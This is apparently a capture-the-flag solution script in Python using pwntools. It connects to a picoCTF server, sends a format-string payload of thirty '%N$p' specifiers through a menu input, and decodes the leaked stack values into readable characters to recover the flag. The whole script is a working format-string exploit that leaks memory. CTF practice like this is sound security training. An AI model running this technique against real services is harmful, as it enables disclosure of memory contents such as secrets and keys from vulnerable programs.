from pwn import *

p = remote('wily-courier.picoctf.net', 62528)

payload = b'%1$p-%2$p-%3$p-%4$p-%5$p-%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p-%13$p-%14$p-%15$p-%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p-%23$p-%24$p-%25$p-%26$p-%27$p-%28$p-%29$p-%30$p'

p.recvuntil(b'2) View my portfolio')
p.sendline(b'1')

p.recvuntil(b'?\n')
p.sendline(payload)

p.recvuntil(b':\n')
response = p.recvline()

values = response.decode().strip().split('-')


for val in values:
   
    try:
        num = int(val, 16)
        byte_length = (num.bit_length() + 7) // 8
        for byte in num.to_bytes(byte_length, 'little'):
            print(chr(byte), end='')
    except:
        pass


